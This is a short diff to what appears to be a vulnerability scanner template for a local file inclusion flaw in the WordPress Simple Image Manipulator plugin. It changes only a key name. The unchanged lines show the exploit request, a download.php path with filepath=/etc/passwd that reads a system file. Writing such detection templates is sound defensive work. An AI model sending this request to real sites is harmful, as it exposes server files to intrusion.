@@ -13,7 +13,7 @@ info:
     cwe-id: CWE-22
   tags: wordpress,wp-plugin,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd'
